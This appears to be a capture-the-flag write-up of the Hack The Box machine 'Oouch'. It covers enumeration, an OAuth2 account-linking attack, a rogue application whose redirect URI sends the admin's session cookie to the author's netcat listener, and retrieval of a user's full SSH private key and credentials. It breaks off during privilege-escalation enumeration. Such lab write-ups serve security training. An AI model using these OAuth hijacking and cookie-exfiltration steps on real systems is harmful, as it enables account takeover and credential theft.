# HTB - Oouch

## Overview

![](../.gitbook/assets/1-oouch-infocard.png)

## Useful Skills and Tools

## Enumeration

### Nmap scan

First off, I started my enumeration with an nmap scan of `10.10.10.177`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.

```bash
zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch 10.10.10.177

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:10 EDT
WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for 10.10.10.177
Host is up (0.13s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.81
|      Logged in as ftp                                                                                
|      TYPE: ASCII                                                                                     
|      Session bandwidth limit in byte/s is 30000                                                      
|      Session timeout in seconds is 300                                                               
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp  open     http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
5643/tcp  filtered unknown
8000/tcp  open     rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest: 
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions: 
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
24079/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=6/9%Time=5EDFD9E7%P=x86_64-pc-linux-gnu%r(Get
SF:Request,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h
SF:1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Requ
SF:est\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>
SF:Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\
SF:r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Autho
SF:rization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
```

Next, see if you can connect anonymously to ftp...and we can!

```text
zweilos@kalimaa:~/htb/oouch$ ftp 10.10.10.177

Connected to 10.10.10.177. 
220 qtc's development server 
Name (10.10.10.177:zweilos): anonymous 
230 Login successful.    
Remote system type is UNIX. 
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> get project.txt
local: project.txt remote: project.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for project.txt (49 bytes).
226 Transfer complete.
49 bytes received in 0.00 secs (314.8129 kB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
226 Directory send OK.
ftp> quit
221 Goodbye.
```

Only one file `project.txt` was on the server, and we couldn't navigate anywhere else.

```text
zweilos@kalimaa:~/htb/oouch$ cat project.txt
Flask -> Consumer
Django -> Authorization Server
```

Looks like `Flask` and `Django` are the two types of frameworks for the different services on a website. Time to check the next ports. SSH did not allow me to connect without a private key _\(note that there is no password though\)_.

```text
zweilos@kalimaa:~/htb/oouch$ ssh 10.10.10.177
zweilos@10.10.10.177: Permission denied (publickey).
```

Navigating to `http://10.10.10.177:5000` led to a login page.

![](../.gitbook/assets/screenshot_2020-06-09_15-36-13.png)

## Initial Foothold

From here I went to the `Register` page, created an account, logged in, and started looking around the internal site. There was not much to do, though there was an interesting "send a message to the administrator" input box on the `/contact` page.

![](../.gitbook/assets/screenshot_2020-06-09_15-41-13.png)

Attempting to check for XSS on the contact page using `javascript:alert(document.cookie)` resulted in: `"Hacking Attempt Detected"` and a one minute IP ban \(see screenshot below\). Sending the word 'javascript' was fine...but sending just the word 'alert' also triggered this message...There must be some sort of filter, WAF, or IPS.

![](../.gitbook/assets/screenshot_2020-06-09_16-04-27.png)

I then used gobuster to search for more accessible directories and found an `/oauth` page. `http://10.10.10.177:5000/oauth` led to a "hidden" page with the following links:

![](../.gitbook/assets/screenshot_2020-06-10_10-17-42.png)

> * In order to connect your account:`http://consumer.oouch.htb:5000/oauth/connect`
> * Once your account is connected, login here:`http://consumer.oouch.htb:5000/oauth/login`

After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`. I added the newly enumerated domains to my `/etc/hosts` file so I could proceed.

```text
10.10.10.177    oouch.htb
10.10.10.177    consumer.oouch.htb
10.10.10.177    authorization.oouch.htb
```

I didn't have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register. The register link was at the root at `http://authorization.oouch.htb:8000/`.

![](../.gitbook/assets/screenshot_2020-06-10_11-16-23.png)

I used these sites to do some research on the Oauth 2 protocol:

> [https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/](https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/) [https://aaronparecki.com/oauth-2-simplified/](https://aaronparecki.com/oauth-2-simplified/) [RFC 6749: The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)

After creating an account and logging in, I was greeted with two API links `/oauth/get_user` and `/oauth/token`.

![](../.gitbook/assets/screenshot_2020-06-13_07-09-34.png)

They didn't seem to do anything yet \(according to my research I needed a higher privilege authorization token\), so I went back to original account on `http://consumer.oouch.htb:5000/oauth` to use the `/connect` link to authorize my two accounts to connect. Using Burp, I allowed each of the requests until got to the button to authorize the connect:

I then clicked the button, allowed the POST to the server in Burp,

```http
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Content-Type: application/x-www-form-urlencoded
Content-Length: 266
Connection: close
Cookie: csrftoken=NfJT07Vec0wl4nbyaopTMl0qYHv5UAXMiJeIrn1yEi61fv4tv76sl9p0tJeWv4SX; sessionid=7sfqfco25nztiemxl9cdahojkewxw2xj
Upgrade-Insecure-Requests: 1
DNT: 1

csrfmiddlewaretoken=ZNU3fziGduXycKscNjozBj8EY2TLhuRYei3lxLEWB80XoWZSBdn8SXVIb4zZb7G0&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
```

...then intercepted the GET request with the authorization link, and dropped the request in Burp so it wouldn't authorize the two accounts to be linked. I needed to start the authorization process in order to get a link that I could use to get any other account to connect to mine.

```http
GET /oauth/connect/token?code=OcnuHPMmp4x0UcGjI9Tp87tnvxdfI6 HTTP/1.1
Host: consumer.oouch.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Connection: close
Cookie: session=.eJwlT7tuwzAM_BVHcwaJkqjIn9EOHYogoCgyMeLYgGVPQf69AjodDvfA3dvcdKb2kGbG37cZ9g7mJa3RXczZfMl9avtG-7Quw_fB3BU95tPwIzOvLxmeNC0nc_1cz71ok_Yw474d0tlUzWgIgAQROWMK9oI5CWoIwNmjEla2TmJ16InRW2V7UUfAnBLGnkAbE_oi6h0HT6VycS6iBQdETn3MzByxQqICLlmpQTS4AAqhez31C9w2ve3rU5a-B4pjqVI1-hSiiI25BE5UMyUINqAApT6q544m2_8JNJ8_--NYTw.XuEzuA.FcBkilyEHZbTXL3aPtl9PU66Kmk
Upgrade-Insecure-Requests: 1
DNT: 1
```

## Road to User

Next, I needed to get the admin to link his account to mine in order to escalate my privileges. I went back to the `http://consumer.oouch.htb:5000/contact` page, and sent the admin the link with my authorization token request link, which was already activated through the POST message earlier. All I needed was for the admin to click the link to connect our accounts. This was an example of an attack called [Server-side Request Forgery \(SSRF\)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).

The link I sent: `http://consumer.oouch.htb:5000/oauth/connect/token?code=4GCuHQ0LTjKkezQmz2jlolgHxfLXbc` _\(copied from the url bar after Burp dropped the `GET` above.\)_ I then used the link `http://consumer.oouch.htb:5000/oauth/login` from the `/oauth` page to authorize the account connection.

> _Note: You have to log in fast otherwise the token expires!_

The `/profile` page now showed:

![](../.gitbook/assets/screenshot_2020-06-10_15-42-54.png)

> Username: qtc Email: qtc@nonexistend.nonono Connected-Accounts: kainoauth.

### Finding the developer creds

And on the `/documents` page we now had the following:

> Hello qtc! You have currently following documents stored:
>
> * dev\_access.txt        **develop:supermegasecureklarabubu123!** -&gt; Allows application registration.
> * o\_auth\_notes.txt    /api/get\_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.
> * todo.txt            Chris mentioned all users could obtain my ssh key. Must be a joke...

We now have some developer creds...but where to use them? I turned to gobuster once again to search for more directories, and found `/oauth/applications/register/` which gives us a basic authentication login to use the develop creds above...and now we can register an application!?

![Screenshot\_2020-06-11\_02-17-02.png](https://github.com/zweilosec/htb-writeups/tree/6febf8c8db1b53fd2442636c0874aac26d8a2069/machines/:/bd448d933cc9493fb8b87d68119036f8) _I forgot the port on my redirect URL the first time. Luckily there is an edit button!_

> Here is some programming information about registering Django apps at [https://django-registration.readthedocs.io/en/3.1/quickstart.html](https://django-registration.readthedocs.io/en/3.1/quickstart.html).  
> I also did some more research at [https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html](https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html) on how to register a new application.

You can apparently set the authorization link to redirect whereever you want. By setting the redirect url to be my local machine, I could then listen for a connection with nc.

My registration request looked like this in Burp:

```http
POST /oauth/applications/register/ HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/applications/register/
Content-Type: application/x-www-form-urlencoded
Content-Length: 598
Authorization: Basic ZGV2ZWxvcDpzdXBlcm1lZ2FzZWN1cmVrbGFyYWJ1YnUxMjMh
Connection: close
Cookie: csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733HrfmA; sessionid=t8pysxzmxfaziblsj7bji2hz79kz7mry
Upgrade-Insecure-Requests: 1
DNT: 1

csrfmiddlewaretoken=8saMcdN6jW2HIJjcK33GCJ7TeAXljGnDvZbLYVRNgNzPSGJ1xWjjhYWRalMvov1A&name=kaio&client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&initial-client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&initial-client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&client_type=public&authorization_grant_type=authorization-code&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234
```

```http
GET /accounts/login/?next=/oauth/applications/register/ HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://authorization.oouch.htb:8000/oauth/applications/register/
Connection: close
Cookie: csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733HrfmA
Upgrade-Insecure-Requests: 1
DNT: 1
```

> _Side note: After creating app and clicking "back" it prompts for basic authentication with the text “Oouch Admin Only” at url `http://authorization.oouch.htb:8000/oauth/applications/`. The `develop` creds did not work here._

I then sent an authorize request to the server to connect to the app I 'created', which should redirect to my nc listener:

```http
GET /oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eOS5; sessionid=veopt7hc8e8bv4jwl4ekv4ejlby8kxdn
Upgrade-Insecure-Requests: 1
DNT: 1
```

Got a connection from nc!

```bash
zweilos@kalimaa:~/htb/oouch$ nc -lvnp 1234 > djangoapp                                                 
listening on [any] 1234 ...                                                                            
connect to [10.10.14.253] from (UNKNOWN) [10.10.14.253] 53300
```

The connection only sent this message, but it was enough to see that it worked how I wanted.

```http
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Host: 10.10.14.253:1234
```

After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the `http://consumer.oouch.htb:5000/contact` page to see if we could use SSRF again to get any further info:

`http://authorization.oouch.htb:8000/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&grant_type=authorization-code&client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS`.

And I got a reply!

```http
GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.253:1234
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
```

I now had a session cookie to log into `http://authorization.oouch.htb:8000/` as `qtc` _\(I first tried it on `http://consumer.oouch.htb:5000`, but it didn't do anything\)_.

![](../.gitbook/assets/screenshot_2020-06-11_02-51-40.png)

Now that I had another account, it was time to try to get an authorization token to access the APIs `/oauth/token` and `/oauth/get_user` I saw earlier.

Next I did more oauth 2 research, in particular on authenticating to APIs:

> * [https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end](https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end)
> * [https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm](https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm)
>
>     I found out that the grant type must be `client_credentials`
>
> * [https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/](https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/)
>
>     and the request must also include `client_id` and `client_secret`.

My first attempts failed:

```http
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
Content-Length: 227
Content-type:application/x-www-form-urlencoded

grant_type=client_credentials&
client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&
client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
```

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
WWW-Authenticate: Bearer, error="invalid_client"
X-Frame-Options: SAMEORIGIN
Content-Length: 27
Vary: Authorization

{"error": "invalid_client"}
```

I kept getting `"invalid_grant_type"` and `"invalid_client"` errors, and found out that the the request cannot have newlines in it! [https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an](https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an)

My next attempt went better:

```http
POST /oauth/token/ HTTP/1.1
Host: authorization.oouch.htb:8000
Content-type:application/x-www-form-urlencoded
Content-Length: 223

grant_type=client_credentials&client_id=BINNWck8w5CElXxFcUp4hWlbbnJ9YSRautJ2WNjh&client_secret=MGOEEB0A2EptkpF35uYoJOwVgBQDISm2RQAzojkGK4N3whYaSiAl3mjf7EoPyjteCGoJbuiMCSNI1OhxzjEpETFNoUSHvIaMsIUVEos1KKumTFlZ3obeZYhMYthZKVIz
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 116
Vary: Authorization

{"access_token": "A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
```

### Finding user creds

I got the access token! I then tried to use the token to get info from the `/oauth/get_user` API, but got back nothing useful. The note on qtc's `/documents` page mentioned easy **user** access to the ssh key...

```http
GET /api/get_ssh/?access_token=A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg HTTP/1.1
Host: authorization.oouch.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eOS5; sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;
Upgrade-Insecure-Requests: 1
DNT: 1
Cache-Control: max-age=0
```

And we got the SSH key! It annoyingly was on a single line and had a lot of `\n` characters in it that had to be fixed.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2708
Vary: Authorization, Cookie

{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
```

The next step was to use SSH to login to the machine. _`ssh -i < private_key_name>` lets you use a private key to login._

> _Note: Dont forget to `chmod 600` your ssh keys before use!_

### User.txt

```bash
zweilos@kalimaa:~/htb/oouch$ chmod 600 qtc.id_rsa
zweilos@kalimaa:~/htb/oouch$
zweilos@kalimaa:~/htb/oouch$ ssh qtc@10.10.10.177 -i qtc.id_rsa

Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3

qtc@oouch:~$ whoami && hostname
qtc
oouch
qtc@oouch:~$ uname -a
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux

qtc@oouch:~$ cat user.txt 
6c92fdd3954c49f4c3e0e76d95d0cd2b

qtc@oouch:~$ cat .note.txt 
Implementing an IPS using DBus and iptables == Genius?
```

I got the `user.txt`! There was also a hidden file named `.note.txt` that mentioned using `DBus` and `iptables` to implement an IPS.

## Path to Power \(Gaining Administrator Access\)

### Enumeration as user - `qtc`

While enumerating I found a `htb.oouch.Block.conf` in the dbus configuration files:

```bash
qtc@oouch:/etc/dbus-1/system.d$ ls
bluetooth.conf                      htb.oouch.Block.conf             wpa_supplicant.conf
com.ubuntu.SoftwareProperties.conf  org.freedesktop.PackageKit.conf

qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf
```

```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

        <policy user="www-data">
                <allow send_destination="htb.oouch.Block"/>
                <allow receive_sender="htb.oouch.Block"/>
        </policy>

</busconfig>
```

So the www-data can send and recieve on dbus using `htb.oouch.Block`...but not sure how to use this right now.

As seen in my `ip a` output Docker is running...can I connect?

```bash
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:f9:aa:6c:dd brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:61:5e:2b:bf brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
